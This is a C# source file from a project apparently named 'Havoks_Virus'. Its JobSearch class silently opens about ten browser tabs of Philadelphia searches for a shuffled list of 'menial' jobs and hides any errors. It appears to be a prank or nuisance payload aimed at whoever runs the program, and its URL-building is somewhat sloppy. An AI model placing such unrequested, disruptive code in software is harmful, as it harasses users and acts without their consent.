using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Havoks_Virus
{
    public class JobSearch
    {
        // Array of job search URLs targeting different roles in Philadelphia
        private static string[] jobWebsites = {
            "https://www.theladders.com/jobs/searchresults-jobs?keywords=&location=Philadelphia,%20PA&order=SCORE&distance=80&remoteFlags=Hybrid&remoteFlags=In-Person",
            "https://www.monster.com/jobs/search/?q=",
            "https://www.glassdoor.com/Job/jobs.htm?suggestCount=0&suggestChosen=false&clickSource=searchBtn&typedKeyword=",
            "https://www.usajobs.gov/Search?l=Philadelphia%2C%20Pennsylvania&k=&p=1",
            "https://www.roberthalf.com/jobs/?l=Philadelphia%2C%20PA&keyword=",
            "https://www.careerbuilder.com/jobs-in-philadelphia,pa?keywords=",
            "https://www.simplyhired.com/search?q=",
            "https://www.snagajob.com/search?q=&w=philadelphia,+pa&radius=20",
            "https://jooble.org/SearchResult?rgns=Philadelphia%2C%20PA&ukw=",
            "https://philadelphia.craigslist.org/d/jobs/search/jjj?query="
        };

        // Array of job titles to search
        private static string[] menialJobs = {
            "cashier",
            "janitor",
            "dishwasher",
            "cleaner",
            "server",
            "stocker",
            "barista",
            "housekeeping",
            "courier",
            "retail",
            "fry cook",
            "greeter",
            "doorman",
            "taxi driver",
            "landscaper",
            "busboy",
            "delivery person",
            "fast food worker",
            "maid",
            "laundry attendant",
            "stock clerk",
            "telemarketer",
            "factory worker",
            "farmhand",
            "sanitation worker",
            "security guard",
            "waiter",
            "waitress",
            "retail clerk",
            "parking attendant",
            "car wash attendant",
            "assembly line worker",
            "food prep worker",
            "babysitter",
            "pet sitter",
            "garbage collector",
            "equine reproduction technician",
            "telemarketer", 
            "skip tracer", 
            "military recruitment"
        };

        public static void OpenJobSearchTabs()   //(string jobkeyword)
        {
            try
            {
                // Randomize the order of the job titles
                Shuffle(menialJobs);

                for (int i = 0; i < jobWebsites.Length; i++)
                {
                    // Retrieve a job role from the menialJobs array. 
                    // Using modulus (%) ensures that the index wraps around if it exceeds the array length.
                    string jobRole = menialJobs[i % menialJobs.Length];

                    // URL encode the job role to ensure it is safe for use in a URL (e.g., spaces become %20)
                    string encodedJobRole = System.Net.WebUtility.UrlEncode(jobRole);

                    // Construct the full URL for the job search by replacing the placeholder in each website's URL with the encoded job role.
                    // The replacement string depends on the parameter name used by each job search website for the job title in its URL.
                    string url = jobWebsites[i]
                        .Replace("keywords=", "keywords=" + encodedJobRole)             // Used by The Ladders for job title parameter.
                        .Replace("q=", "q=" + encodedJobRole)                           // Commonly used by many sites like Monster and Snagajob for job title parameter.
                        .Replace("typedKeyword=", "typedKeyword=" + encodedJobRole)     // Used by Glassdoor for job title parameter.
                        .Replace("keyword=", "keyword=" + encodedJobRole)               // Used by Robert Half and CareerBuilder for job title parameter.
                        .Replace("ukw=", "ukw=" + encodedJobRole)                       // Used by Jooble for job title parameter.
                        .Replace("query=", "query=" + encodedJobRole)                   // Used by Craigslist for job title parameter.
                        .Replace("k=", "k=" + encodedJobRole)                           // Used by USAJobs for job title parameter.
                        + "&l=Philadelphia,PA";                                         // Append the location parameter at the end for all URLs.

                    // Start the default browser with the job search URL using Process.Start.
                    // This launches each job search in a new browser tab/window.
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = url,
                        UseShellExecute = true
                    });
                }

                //System.Console.WriteLine("Opened job search tabs in your default browser.");      //used for debugging
            }
            catch (Exception ex)
            {
                // Log any errors encountered when opening the job search tabs
                //System.Console.WriteLine("An error occurred while opening tabs: " + ex.Message);      //used for debugging 
            }
        }

        // Method to shuffle the job titles array
        private static void Shuffle<T>(T[] array)
        {
            Random rng = new Random();
            int n = array.Length;
            while (n > 1)
            {
                n--;
                int k = rng.Next(n + 1);
                T value = array[k];
                array[k] = array[n];
                array[n] = value;
            }
        }

        // Method to get a random job title from the menialJobs array
        public static string GetRandomJobTitle()
        {
            Random rng = new Random();
            return menialJobs[rng.Next(menialJobs.Length)];
        }
    }
}